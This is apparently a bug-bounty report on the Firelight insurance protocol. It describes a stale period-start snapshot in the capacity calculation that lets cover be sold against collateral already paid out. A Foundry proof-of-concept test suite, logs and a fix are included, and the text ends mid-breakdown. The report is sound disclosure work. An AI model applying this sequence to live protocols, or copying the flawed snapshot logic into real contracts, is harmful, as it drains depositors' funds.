# 88992 sc high protocol insolvency and lp fund drain via stale underwriting capacity calculation following cross period payouts

**Submitted on Aug 16th 2026 at 10:23:41 UTC by @progabbomala for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88992
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/CoverOrderAllocator.sol>
* **Impacts:**
  * Protocol insolvency

## Description

### Brief/Intro

A critical accounting desynchronization in `CoverOrderAllocator._computeAvailableCapacity` allows the protocol to underwrite and settle cover obligations far exceeding actual vault collateral, breaking the intended risk invariant represented by `MAX_LEVERAGE_FACTOR = 5`. When an incident from a previous period (Period P-1) is paid out during the current period (Period P) within the protocol's legal two-period payout window, physical assets exit the vault via `safeTransfer`. However, `_computeAvailableCapacity` queries `vault.totalAssetsAt(currentPeriodStart())`, which continues to return the pre-payout snapshot. Consequently, `CoverOrderAllocator` calculates an inflated capacity ceiling, allowing the protocol to sell underwritten cover backed by phantom collateral. When legitimate claims are filed against this sold cover, the protocol suffers an immediate 90% default (protocol insolvency), or completely drains deposits made by subsequent Liquidity Providers (LPs) to honor ghost cover.

### Vulnerability Details

#### Root Cause: Asymmetric State Query in Capacity Calculation

In `CoverOrderAllocator.sol`, `_computeAvailableCapacity` is responsible for enforcing the global underwriting capacity ceiling for a given period:

```solidity
function _computeAvailableCapacity(
    CoverOrderAllocatorStorage storage $,
    uint256 period
) internal view returns (uint256 totalAvailableCapacity) {
    uint256 assetPriceUSD = $.priceFeedAdapter.getPrice($.maxPriceAge);

    CapacityConfig storage config = _getEffectiveCapacityConfig(period);

    uint256 firstLossBufferUSDCanonical = Decimals.convert(
        config.firstLossBufferToken.balanceOf(config.firstLossBuffer),
        _readDecimals(address(config.firstLossBufferToken)),
        CANONICAL_DECIMALS,
        Math.Rounding.Floor
    );
    uint256 totalAssetsCanonical = Decimals.convert(
        $.vault.totalAssetsAt($.vault.currentPeriodStart()), // @audit STALE SNAPSHOT
        $.vaultAssetDecimals,
        CANONICAL_DECIMALS,
        Math.Rounding.Floor
    );
    uint256 stakedAssetsValueUSDCanonical = totalAssetsCanonical.mulDiv(assetPriceUSD, 10 ** $.priceFeedDecimals);
    uint256 availableCollateralCanonical = firstLossBufferUSDCanonical + stakedAssetsValueUSDCanonical;

    uint256 strictCapacity = availableCollateralCanonical.mulDiv(config.effectiveLeverage, config.minCAR);
    totalAvailableCapacity = strictCapacity.mulDiv(
        BPS_DENOMINATOR + config.divergenceToleranceBps,
        BPS_DENOMINATOR
    );
}
```

Notice the state query asymmetry:

1. **Oracle Price** is read **live**: `$.priceFeedAdapter.getPrice($.maxPriceAge)`
2. **First-Loss Buffer (FLB)** is read **live**: `config.firstLossBufferToken.balanceOf(...)`
3. **Vault Assets** are read from a **period-start snapshot**: `$.vault.totalAssetsAt($.vault.currentPeriodStart())`

#### The Cross-Period Payout Desynchronization

Firelight explicitly designs a 2-period payout window (`_isPeriodInPayoutWindow(capturePeriod, currentPeriod)` allows execution when `currentPeriod == capturePeriod || currentPeriod == capturePeriod + 1`).

Consider the following step-by-step operational timeline:

| Step  | Period | Action                                               | Live Vault Assets | Snapshot (`totalAssetsAt`) | Capacity Allowed | Real Backing Ratio                   |
| ----- | ------ | ---------------------------------------------------- | ----------------- | -------------------------- | ---------------- | ------------------------------------ |
| **1** | P0     | LP deposits 1000 USDC                                | 1000 USDC         | 1000 USDC                  | 2000 USD         | 100% (1.0x)                          |
| **2** | P1     | Period 1 starts at T\_start                          | 1000 USDC         | 1000 USDC                  | 2000 USD         | 100% (1.0x)                          |
| **3** | P1     | Payout of 800 USDC for P0 incident (T\_1 > T\_start) | **200 USDC**      | **1000 USDC (Stale)**      | 2000 USD         | **20%**                              |
| **4** | P1     | 2000 USD Cover committed & settled                   | 200 USDC          | 1000 USDC (Stale)          | 2000 USD         | **10% Backing (10x Leverage)**       |
| **5** | P1     | 2000 USD Claim approved                              | 0 USDC (paid 200) | 1000 USDC (Stale)          | 2000 USD         | **1800 USD Shortfall (90% Default)** |

#### Violation of Protocol Risk Invariant

`CoverOrderAllocator.sol` (lines 79–82) explicitly documents the fundamental risk invariant:

```solidity
// Cap on `effectiveLeverage` relative to `minCAR`. Real backing behind sold cover is
// `minCAR / (effectiveLeverage × (1 + tolerance))`, so bounding the ratio floors it at
// `1 / (MAX_LEVERAGE_FACTOR × (1 + tolerance))` regardless of the configured `minCAR`.
uint256 private constant MAX_LEVERAGE_FACTOR = 5;
```

This constraint exists to guarantee that the real physical backing behind sold cover never falls below:

```
Required Minimum Backing = 1 / MAX_LEVERAGE_FACTOR = 1 / 5 = 20%
```

Following the cross-period payout:

```
Real Backing = Actual Vault Assets / Cover Sold = 200 USDC / 2000 USD = 10%
Effective Leverage = Cover Sold / Actual Vault Assets = 2000 USD / 200 USDC = 10x
```

The effective leverage reaches **10x**, cutting the real collateral backing in half (10% vs 20% minimum floor), violating the intended risk envelope established by `MAX_LEVERAGE_FACTOR`.

#### Additional Vector: Delayed Withdrawal Requests

The same stale-snapshot issue also applies to delayed withdrawal requests: after a mid-period withdrawal, `totalAssets()` decreases while `totalAssetsAt(periodStart)` remains unchanged, creating the same capacity inflation even without an incident payout.

### Impact Details

#### Impact 1: Protocol Insolvency on Legitimate Claims (`test_PoC_fullClaimDefaultsOnSoldCover`)

* Cover buyer purchases 2000 USD of valid cover and pays the full premium.
* An incident occurs in Period 1 for 2000 USD.
* `IncidentManager` approves the full 2000 USD claim.
* At payout time, the vault's live balance is only 200 USDC, while the period-start snapshot used for exposure capping returns 1000 USDC. The payout logic is bounded by the available physical balance, paying out only 200 USDC.
* The vault transfers 200 USDC and permanently marks the incident as **`CLOSED`**.
* **Shortfall**: **1800 USD (90% unrecoverable default)** on legitimate, settled cover obligations. The protocol is insolvent with respect to its underwritten commitments.

#### Impact 2: Direct Fund Drain / Slashing of Subsequent Depositors (`test_PoC_lateLpIsSlashedToHonorGhostCover`)

* After the 2000 USD cover is settled against 200 USDC live AUM, a new LP deposits 800 USDC in Period 1 (deposits are open because no Period 1 incident has been opened yet).
* Vault balance becomes 200 + 800 = 1000 USDC.
* An incident occurs in Period 1 for 2000 USD.
* When `IncidentManager` executes payout:
  * Exposure cap is read from the period-start snapshot (1000 USDC).
  * Active payable amount is 1000 USDC.
  * Payout extracts **all 1000 USDC**, including the 800 USDC deposited by the new LP.
* **The new LP suffers a 100% total loss of their deposit (0 redeemable assets)** to pay for ghost cover that was sold before their deposit against capital that had already left the vault.

## Scope & Validity Justification

### 1. Explicit Mapping to In-Scope Priority Area and Impacts

* **Program Priority Area**: The Firelight program overview states:

  > *"Firelight is most concerned about: Commitment and settlement correctness in CoverOrderAllocator. **Capacity calculation and solvency constraints.** Incident/payout accounting..."*
* **Immunefi Impact**: This vulnerability maps directly to **`Protocol insolvency`**, listed as **Critical** in the Immunefi Firelight Impacts in Scope table. As a direct consequence, it causes unintended loss of user funds for late LPs.

### 2. The Trusted Matcher Does Not Save the Protocol (No Privileged Role Misbehavior)

The Immunefi rules state:

> *"Reports requiring these trusted parties to act maliciously or incorrectly within their documented privileges are not eligible unless they demonstrate that the role can exceed its intended authority or bypass an intended protocol constraint."*

* The matcher is not required to act incorrectly or maliciously. The matcher submits a capacity value that is validated on-chain by `_validateMatchingCapacity`.
* The PoC proves that the contract's own internal capacity calculation (`_computeAvailableCapacity`) returns `2000e18` as the maximum accepted value.
* Therefore, the matcher is simply operating within the authoritative on-chain capacity ceiling. The bug is in the contract's capacity calculation logic, not in the operator's judgment.

### 3. Direct On-Chain Proof of Constraint Bypass (`MatchingCapacityOverflow`)

The PoC provides direct proof using the contract's own revert error payload:

* Calling `commitAllocation(period, root, COVER, COVER + 1)` reverts with `MatchingCapacityOverflow(2000e18 + 1, 2000e18)`.
* The second parameter of the revert (`maxCapacity = 2000e18`) proves that the smart contract itself evaluates maximum capacity as 2000 USD while holding only 200 USDC of live collateral.

### 4. Distinct from the "Collateral Drawdown" Known Issue

The Known Issue on collateral drawdown states:

> *"If the underlying staked asset decreases in USD value, available capital and the Capital Adequacy Ratio decrease. Severe collateral drawdowns can reduce coverage capacity and may cause shortfalls or undercollateralization relative to outstanding cover obligations."*

* The Known Issue refers to a **market-driven decrease in the USD value** of the underlying asset (e.g. Flare/FLR price drop on an external oracle).
* Here, the asset price remains **completely constant at 1.00 USD**.
* The reduction in backing is caused exclusively by an on-chain transfer of vault assets after a protocol payout, which the capacity calculation fails to reflect.

### 5. Distinct from the "Aggregate Claims Cap" Known Issue (KI #3)

Known Issue #3 relates to multiple duplicate claims exceeding total cover sold. In this report, there is **one single order** (2000 USD) and **one single claim** (2000 USD). The failure occurs because the cover was sold without collateral backing.

### 6. No Feasibility Limitations

The attack requires no external capital, no flash loans, no oracle manipulation, and no compromised keys. It occurs entirely through standard, sequential protocol operations.

## Suggested Fix

To preserve the intended anti-frontrunning protection of the period snapshot while preventing underwriting against phantom collateral, `_computeAvailableCapacity` should take the minimum between the period-start snapshot and the live physical assets in the vault:

```diff
-   uint256 totalAssetsCanonical = Decimals.convert(
-       $.vault.totalAssetsAt($.vault.currentPeriodStart()),
-       $.vaultAssetDecimals,
-       CANONICAL_DECIMALS,
-       Math.Rounding.Floor
-   );
+   uint256 startAssets = $.vault.totalAssetsAt($.vault.currentPeriodStart());
+   uint256 liveAssets = $.vault.totalAssets();
+   uint256 effectiveVaultAssets = Math.min(startAssets, liveAssets);
+
+   uint256 totalAssetsCanonical = Decimals.convert(
+       effectiveVaultAssets,
+       $.vaultAssetDecimals,
+       CANONICAL_DECIMALS,
+       Math.Rounding.Floor
+   );
```

## Affected Code References

* `CoverOrderAllocator.sol::_computeAvailableCapacity()` (lines 696–725)
* `CoverOrderAllocator.sol::_validateMatchingCapacity()` (lines 394–403)
* `CoverOrderAllocator.sol::MAX_LEVERAGE_FACTOR` (lines 79–82)
* `FirelightVault.sol::payout()` (lines 892–960)
* `FirelightVault.sol::totalAssetsAt()` (lines 457–473)
* `IncidentManager.sol::_executePayout()` (lines 620–690)

## Proof of Concept

### Steps to Reproduce

{% stepper %}
{% step %}

#### Clone the repository and install dependencies

```bash
git clone -b v1_audit_ready https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
npm install
forge install foundry-rs/forge-std --no-git
```

{% endstep %}

{% step %}

#### Create `foundry.toml` in the repository root

Enable `via_ir = true` matching `hardhat.config.js`:

```toml
[profile.default]
src = "contracts"
test = "test/foundry"
libs = ["lib", "node_modules"]
auto_detect_solc = true
evm_version = "london"
optimizer = true
optimizer_runs = 1000
via_ir = true

remappings = [
    "@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/",
    "@openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/",
    "flare-smart-contracts/=node_modules/flare-smart-contracts/",
    "forge-std/=lib/forge-std/src/"
]
```

{% endstep %}

{% step %}

#### Save the PoC test file

Save the PoC test file below to `test/foundry/PoC_StaleCommitCapacity.t.sol`.
{% endstep %}

{% step %}

#### Execute the Foundry test suite

```bash
forge test --match-path test/foundry/PoC_StaleCommitCapacity.t.sol -vv
```

{% endstep %}
{% endstepper %}

### Test File: `test/foundry/PoC_StaleCommitCapacity.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {FirelightVault} from "contracts/core/FirelightVault.sol";
import {CoverOrderAllocator} from "contracts/core/CoverOrderAllocator.sol";
import {CoverNFT} from "contracts/core/CoverNFT.sol";
import {IncidentManager} from "contracts/core/IncidentManager.sol";
import {ICoverOrderAllocator} from "contracts/core/interfaces/ICoverOrderAllocator.sol";
import {IFirelightVault} from "contracts/core/interfaces/IFirelightVault.sol";
import {IIncidentManager} from "contracts/core/interfaces/IIncidentManager.sol";
import {IAggregatorV3} from "contracts/core/interfaces/IAggregatorV3.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract TestAsset is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract TestPriceFeed is IAggregatorV3 {
    uint8 public immutable override decimals;
    int256 public price;
    uint256 public updatedAt;

    constructor(uint8 _decimals, int256 _price) {
        decimals = _decimals;
        price = _price;
        updatedAt = block.timestamp;
    }

    function setPrice(int256 _price) external {
        price = _price;
        updatedAt = block.timestamp;
    }

    function latestRoundData()
        external
        view
        override
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAtTime,
            uint80 answeredInRound
        )
    {
        return (1, price, block.timestamp, block.timestamp, 1);
    }

    function getRoundData(uint80) external pure override returns (uint80, int256, uint256, uint256, uint80) {
        revert("Not implemented");
    }

    function description() external pure override returns (string memory) {
        return "TestPriceFeed";
    }

    function version() external pure override returns (uint256) {
        return 1;
    }
}

contract PoC_StaleCommitCapacity is Test {
    uint48 internal constant PERIOD = 1 days;
    uint256 internal constant MIN_CAR = 12_000;
    uint256 internal constant LEVERAGE = 24_000; // 2.0x
    uint256 internal constant MAX_LEVERAGE_FACTOR = 5;

    uint256 internal constant DEPOSIT = 1000e18;
    uint256 internal constant PAYOUT = 800e18;
    uint256 internal constant COVER = 2000e18; // 2x of initial snapshot AUM

    FirelightVault internal vault;
    CoverOrderAllocator internal allocator;
    CoverNFT internal coverNFT;
    TestAsset internal asset;
    TestPriceFeed internal priceFeed;

    address internal admin = makeAddr("admin");
    address internal curator = makeAddr("curator");
    address internal matcher = makeAddr("allocator");
    address internal flb = makeAddr("flb");
    address internal buyer = makeAddr("buyer");
    address internal lp = makeAddr("lp");
    address internal claimReceiver = makeAddr("claimReceiver");
    address internal coverClaimReceiver = makeAddr("coverClaimReceiver");

    bytes32 internal marketId;

    function setUp() public {
        vm.startPrank(admin);

        asset = new TestAsset();
        priceFeed = new TestPriceFeed(18, int256(1e18));

        FirelightVault vaultImpl = new FirelightVault();
        FirelightVault.InitParams memory vp = FirelightVault.InitParams({
            defaultAdmin: admin,
            limitUpdater: admin,
            blocklister: admin,
            pauser: admin,
            periodConfigurationUpdater: admin,
            rescuer: admin,
            depositLimit: type(uint256).max,
            periodConfigurationDuration: PERIOD
        });
        vault = FirelightVault(
            address(
                new ERC1967Proxy(
                    address(vaultImpl),
                    abi.encodeWithSelector(
                        FirelightVault.initialize.selector,
                        IERC20(address(asset)),
                        "Firelight Vault",
                        "fvToken",
                        abi.encode(vp)
                    )
                )
            )
        );
        vault.grantRole(vault.PAYOUT_ROLE(), admin);
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), admin);
        vault.addToPayoutAllowlist(claimReceiver);

        CoverNFT nftImpl = new CoverNFT();
        coverNFT = CoverNFT(
            address(
                new ERC1967Proxy(
                    address(nftImpl),
                    abi.encodeWithSelector(
                        CoverNFT.initialize.selector,
                        "Cover NFT",
                        "cNFT",
                        "",
                        admin,
                        admin,
                        address(0),
                        address(0)
                    )
                )
            )
        );

        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](1);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: "Morpho", market: bytes32("m")});

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory conc =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](1);
        conc[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1,
            protocol: "Morpho",
            maxProtocolConcentrationBps: 10_000
        });

        address[] memory premiumTokens = new address[](1);
        premiumTokens[0] = address(asset);

        ICoverOrderAllocator.InitParams memory ip = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(vault)),
            premiumCollector: admin,
            coverNFT: coverNFT,
            priceFeedAdapter: IAggregatorV3(address(priceFeed)),
            maxPriceAge: 7 days,
            premiumTokens: premiumTokens,
            admin: admin,
            adminRole: admin,
            curatorRole: curator,
            allocatorRole: matcher,
            configAdminRole: admin,
            initialProtocolConcentrations: conc,
            newMarkets: markets,
            capacityConfig: ICoverOrderAllocator.CapacityConfig({
                minCAR: MIN_CAR,
                firstLossBufferToken: IERC20(address(asset)),
                firstLossBuffer: flb,
                effectiveLeverage: LEVERAGE,
                minOrderMarketCoverAmount: 1,
                divergenceToleranceBps: 0
            })
        });

        allocator = CoverOrderAllocator(
            address(
                new ERC1967Proxy(
                    address(new CoverOrderAllocator()),
                    abi.encodeCall(CoverOrderAllocator.initialize, (ip))
                )
            )
        );
        coverNFT.grantRole(coverNFT.MINTER_ROLE(), address(allocator));
        vm.stopPrank();

        marketId = keccak256(abi.encode(uint64(1), "Morpho", bytes32("m")));

        asset.mint(lp, DEPOSIT);
        asset.mint(buyer, COVER);
        vm.prank(lp);
        asset.approve(address(vault), DEPOSIT);
        vm.prank(buyer);
        asset.approve(address(allocator), type(uint256).max);
    }

    function _sellExcessCover() internal returns (uint256 orderId, uint48 p0Capture, uint48 p1Start) {
        vm.prank(lp);
        vault.deposit(DEPOSIT, lp);
        p0Capture = uint48(block.timestamp);
        orderId = _createOrder(COVER);

        vm.warp(uint256(vault.currentPeriodEnd()));
        p1Start = vault.currentPeriodStart();
        vm.warp(block.timestamp + 1);

        // Payout of P0 incident occurs during P1 window, reducing vault assets to 200e18
        vm.prank(admin);
        vault.payout(claimReceiver, PAYOUT, p0Capture);

        uint256 snapshotCapacity = _capacity(DEPOSIT);
        (bytes32 root, ICoverOrderAllocator.MarketCoverAllocation[] memory allocs) = _leaf(orderId, COVER);
        uint256 period = vault.currentPeriod();
        vm.prank(matcher);
        allocator.commitAllocation(period, root, COVER, snapshotCapacity);
        vm.prank(matcher);
        allocator.settleCoverOrder(orderId, allocs, new bytes32[](0));
    }

    function _deployIncidentManager() internal returns (IncidentManager im) {
        vm.startPrank(admin);
        im = IncidentManager(
            address(
                new ERC1967Proxy(
                    address(new IncidentManager()),
                    abi.encodeCall(
                        IncidentManager.initialize,
                        (
                            admin,
                            curator,
                            admin,
                            admin,
                            admin,
                            admin,
                            admin,
                            admin,
                            coverClaimReceiver,
                            ICoverOrderAllocator(address(allocator)),
                            IAggregatorV3(address(priceFeed)),
                            uint48(7 days)
                        )
                    )
                )
            )
        );
        vault.grantRole(vault.PAYOUT_ROLE(), address(im));
        vault.grantRole(vault.INCIDENT_ROLE(), address(im));
        vault.addToPayoutAllowlist(coverClaimReceiver);
        vm.stopPrank();
    }

    function _approveFullCoverClaim(IncidentManager im, uint256 orderId, uint48 captureTs) internal {
        vm.startPrank(curator);
        uint256 incidentId = im.createIncident(captureTs, "P1 Claim", keccak256("p1-full"));
        im.confirmIncident(incidentId, "ipfs://report");
        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({coverTokenId: orderId, marketId: marketId, amount: COVER});
        im.addAssessmentLosses(incidentId, losses);
        im.submitCurrentAssessment(incidentId);
        vm.stopPrank();

        vm.prank(admin);
        im.approveCurrentAssessment(incidentId);
    }

    function test_PoC_commitCeilingIgnoresPayoutAfterPeriodStart() public {
        vm.prank(lp);
        vault.deposit(DEPOSIT, lp);
        uint48 p0Capture = uint48(block.timestamp);
        uint256 orderId = _createOrder(COVER);

        vm.warp(uint256(vault.currentPeriodEnd()));
        uint48 periodStart = vault.currentPeriodStart();
        vm.warp(block.timestamp + 1);

        // Payout of P0 incident occurs during P1 window, reducing vault assets to 200e18
        vm.prank(admin);
        vault.payout(claimReceiver, PAYOUT, p0Capture);

        uint256 remaining = DEPOSIT - PAYOUT;
        assertEq(vault.totalAssets(), remaining);
        assertEq(vault.totalAssetsAt(periodStart), DEPOSIT, "Stale period start snapshot");

        (bytes32 root, ICoverOrderAllocator.MarketCoverAllocation[] memory allocs) = _leaf(orderId, COVER);
        uint256 period = vault.currentPeriod();

        // 1. Direct on-chain proof: Any matchingCapacity > 2000e18 is rejected, proving maxCapacity == 2000e18
        vm.expectRevert(
            abi.encodeWithSelector(
                ICoverOrderAllocator.MatchingCapacityOverflow.selector,
                COVER + 1,
                COVER
            )
        );
        vm.prank(matcher);
        allocator.commitAllocation(period, root, COVER, COVER + 1);

        // 2. Direct on-chain proof: Exactly 2000e18 is accepted by the contract
        vm.prank(matcher);
        allocator.commitAllocation(period, root, COVER, COVER);

        // 3. Settlement executes against the committed 2000e18 capacity
        vm.prank(matcher);
        allocator.settleCoverOrder(orderId, allocs, new bytes32[](0));

        ICoverOrderAllocator.CoverOrder memory order = allocator.getCoverOrder(0);
        assertEq(uint256(order.status), uint256(ICoverOrderAllocator.CoverOrderStatus.MATCHED));
        assertEq(order.allocatedCoverAmount, COVER);
        assertEq(coverNFT.ownerOf(0), buyer);

        uint256 minBacking = COVER / MAX_LEVERAGE_FACTOR;
        assertLt(vault.totalAssets(), minBacking, "Backing dropped below the hardcoded 5x leverage floor");

        console.log("=== Stale Commit Capacity Demonstration ===");
        console.log("Period-start AUM snapshot (used on-chain):", vault.totalAssetsAt(periodStart));
        console.log("Live AUM in vault after payout:           ", vault.totalAssets());
        console.log("On-chain computed max capacity:           ", COVER);
        console.log("Real available capacity from live AUM:    ", _capacity(remaining));
        console.log("Cover amount settled:                     ", order.allocatedCoverAmount);
        console.log("Required minimum backing (5x floor):      ", minBacking);
        console.log("Actual backing assets remaining in vault: ", vault.totalAssets());
    }

    function test_PoC_fullClaimDefaultsOnSoldCover() public {
        (uint256 orderId, , uint48 p1Start) = _sellExcessCover();
        IncidentManager im = _deployIncidentManager();

        uint256 lpBefore = vault.totalAssets(); // 200e18
        uint256 receiverBefore = asset.balanceOf(coverClaimReceiver);

        _approveFullCoverClaim(im, orderId, uint48(p1Start + 1));

        (IIncidentManager.Incident memory incident, bool exists) = im.getIncident(1);
        assertTrue(exists);
        assertEq(uint256(incident.status), uint256(IIncidentManager.IncidentStatus.CLOSED));
        assertEq(incident.vaultPaidAmount, lpBefore);
        assertEq(asset.balanceOf(coverClaimReceiver) - receiverBefore, lpBefore);
        assertEq(vault.totalAssets(), 0);

        uint256 shortfall = COVER - incident.vaultPaidAmount;
        assertEq(shortfall, 1800e18);

        console.log("=== Protocol Default on Underwritten Cover ===");
        console.log("Assessed legitimate loss:                 ", COVER);
        console.log("Amount paid by vault:                     ", incident.vaultPaidAmount);
        console.log("Shortfall (unpaid cover obligation):      ", shortfall);
        console.log("Residual LP assets in vault:               ", vault.totalAssets());
    }

    function test_PoC_lateLpIsSlashedToHonorGhostCover() public {
        (uint256 orderId, , uint48 p1Start) = _sellExcessCover();

        address lp2 = makeAddr("lp2");
        uint256 lateDeposit = 800e18;
        asset.mint(lp2, lateDeposit);
        vm.startPrank(lp2);
        asset.approve(address(vault), lateDeposit);
        vault.deposit(lateDeposit, lp2);
        vm.stopPrank();

        assertEq(vault.totalAssets(), 200e18 + lateDeposit);
        assertEq(vault.totalAssetsAt(p1Start), DEPOSIT);

        IncidentManager im = _deployIncidentManager();
        _approveFullCoverClaim(im, orderId, uint48(p1Start + 1));

        (IIncidentManager.Incident memory incident, ) = im.getIncident(1);
        assertEq(incident.vaultPaidAmount, DEPOSIT);
        assertEq(vault.totalAssets(), 0);
        assertGt(vault.balanceOf(lp2), 0);
        assertEq(vault.convertToAssets(vault.balanceOf(lp2)), 0, "Late LP shares redeem for 0 assets");
        assertEq(asset.balanceOf(coverClaimReceiver), DEPOSIT);

        uint256 correctMaxIfLiveUnderwrite = _capacity(200e18);
        assertGt(incident.vaultPaidAmount, correctMaxIfLiveUnderwrite);

        console.log("=== Late Depositor Fund Drain Demonstration ===");
        console.log("Live AUM at underwrite time:              ", uint256(200e18));
        console.log("Late LP deposit amount:                   ", lateDeposit);
        console.log("Total payout extracted:                   ", incident.vaultPaidAmount);
        console.log("Expected max payout with live capacity:   ", correctMaxIfLiveUnderwrite);
        console.log("Excess drained from late LP:              ", incident.vaultPaidAmount - correctMaxIfLiveUnderwrite);
    }

    function test_PoC_snapshotIntentIsOneSided() public {
        asset.mint(lp, 5_000e18);
        vm.prank(lp);
        asset.approve(address(vault), type(uint256).max);

        vm.prank(lp);
        vault.deposit(DEPOSIT, lp);
        uint48 captureTs = uint48(block.timestamp);

        vm.warp(uint256(vault.currentPeriodEnd()));
        uint48 periodStart = vault.currentPeriodStart();
        uint256 snap0 = vault.totalAssetsAt(periodStart);
        assertEq(snap0, DEPOSIT);

        vm.warp(block.timestamp + 1);

        // 1. Mid-period deposit does not inflate the snapshot
        vm.prank(lp);
        vault.deposit(500e18, lp);
        assertEq(vault.totalAssets(), DEPOSIT + 500e18);
        assertEq(vault.totalAssetsAt(periodStart), DEPOSIT);
        assertEq(asset.balanceOf(address(vault)), DEPOSIT + 500e18);

        // 2. Mid-period withdrawal reduces active totalAssets but tokens remain in vault as pending
        vm.prank(lp);
        vault.withdraw(300e18, lp, lp);
        assertEq(vault.totalAssets(), DEPOSIT + 200e18);
        assertEq(vault.totalAssetsAt(periodStart), DEPOSIT);
        assertEq(asset.balanceOf(address(vault)), DEPOSIT + 500e18);
        assertEq(vault.pendingWithdrawAssets(), 300e18);

        // 3. Mid-period payout transfers tokens out of the vault
        vm.prank(admin);
        vault.payout(claimReceiver, PAYOUT, captureTs);
        assertEq(asset.balanceOf(claimReceiver), PAYOUT);
        assertLt(asset.balanceOf(address(vault)), DEPOSIT + 500e18);
        assertEq(vault.totalAssetsAt(periodStart), DEPOSIT);

        // 4. FLB balance is read live at commit time
        asset.mint(flb, 100e18);
        assertEq(asset.balanceOf(flb), 100e18);

        uint256 vaultLegOnChain = vault.totalAssetsAt(vault.currentPeriodStart());
        uint256 vaultLegLive = vault.totalAssets();
        uint256 flbLive = asset.balanceOf(flb);
        assertEq(vaultLegOnChain, DEPOSIT);
        assertLt(vaultLegLive, vaultLegOnChain);
        assertEq(flbLive, 100e18);

        console.log("=== State Invariant Tracking ===");
        console.log("Period-start snapshot:                    ", vaultLegOnChain);
        console.log("Vault ERC20 balance after payout:         ", asset.balanceOf(address(vault)));
        console.log("Live vault AUM:                           ", vaultLegLive);
        console.log("Live FLB balance:                          ", flbLive);
    }

    function _capacity(uint256 vaultAssets) internal pure returns (uint256) {
        return (vaultAssets * LEVERAGE) / MIN_CAR;
    }

    function _createOrder(uint256 coverAmount) internal returns (uint256 orderId) {
        ICoverOrderAllocator.MarketAllocationInput[] memory markets =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        markets[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId,
            coverRateAnnual: 500,
            coverAmount: coverAmount
        });
        vm.prank(curator);
        orderId = allocator.createCoverOrder(
            buyer, buyer, "b", address(asset), markets, ICoverOrderAllocator.CoverOrderType.NEW
        );
    }

    function _leaf(
        uint256 orderId,
        uint256 allocated
    ) internal view returns (bytes32 root, ICoverOrderAllocator.MarketCoverAllocation[] memory allocs) {
        allocs = new ICoverOrderAllocator.MarketCoverAllocation[](1);
        allocs[0] = ICoverOrderAllocator.MarketCoverAllocation({marketId: marketId, allocatedCover: allocated});
        root = keccak256(bytes.concat(keccak256(abi.encode(orderId, allocs))));
    }
}
```

### Execution Logs

```
Ran 4 tests for test/foundry/PoC_StaleCommitCapacity.t.sol:PoC_StaleCommitCapacity
[PASS] test_PoC_commitCeilingIgnoresPayoutAfterPeriodStart() (gas: 1397660)
Logs:
  === Stale Commit Capacity Demonstration ===
  Period-start AUM snapshot (used on-chain): 1000000000000000000000
  Live AUM in vault after payout:            200000000000000000000
  On-chain computed max capacity:            2000000000000000000000
  Real available capacity from live AUM:     400000000000000000000
  Cover amount settled:                      2000000000000000000000
  Required minimum backing (5x floor):       400000000000000000000
  Actual backing assets remaining in vault:  200000000000000000000

[PASS] test_PoC_fullClaimDefaultsOnSoldCover() (gas: 6910371)
Logs:
  === Protocol Default on Underwritten Cover ===
  Assessed legitimate loss:                  2000000000000000000000
  Amount paid by vault:                      200000000000000000000
  Shortfall (unpaid cover obligation):       1800000000000000000000
  Residual LP assets in vault:               0

[PASS] test_PoC_lateLpIsSlashedToHonorGhostCover() (gas: 7120227)
Logs:
  === Late Depositor Fund Drain Demonstration ===
  Live AUM at underwrite time:               200000000000000000000
  Late LP deposit amount:                    800000000000000000000
  Total payout extracted:                   1000000000000000000000
  Expected max payout with live capacity:    400000000000000000000
  Excess drained from late LP:              600000000000000000000

[PASS] test_PoC_snapshotIntentIsOneSided() (gas: 823574)
Logs:
  === State Invariant Tracking ===
  Period-start snapshot:                    1000000000000000000000
  Vault ERC20 balance after payout:         700000000000000000000
  Live vault AUM:                           560000000000000000000
  Live FLB balance:                         100000000000000000000

Suite result: ok. 4 passed; 0 failed; 0 skipped
```

### PoC Test Suite Breakdown

{% stepper %}
{% step %}

#### `test_PoC_commitCeilingIgnoresPayoutAfterPeriodStart` (Protocol Constraint Bypass)

* Demonstrates that after an 800 USDC payout in Period 1 reduces live vault assets to 200 USDC, `CoverOrderAllocator` continues to calculate a stale capacity of 2000 USD.
* **Direct on-chain proof**: Calling `commitAllocation` with `2000e18 + 1` reverts on-chain with `MatchingCapacityOverflow(2000e18 + 1, 2000e18)`, proving the contract's internal calculation evaluated max capacity to be exactly `2000e18`.
* Sells 2000 USD of cover against 200 USDC of collateral, cutting real collateral backing to 10% (10x leverage) and violating the protocol's 5x leverage risk floor (`MAX_LEVERAGE_FACTOR`).
  {% endstep %}

{% step %}

#### `test_PoC_fullClaimDefaultsOnSoldCover` (Protocol Insolvency)

* An honest 2000 USD claim on the underwritten cover is approved by `IncidentManager`.
* The vault pays out its remaining 200 USDC and permanently transitions the incident to `IncidentStatus.CLOSED`.
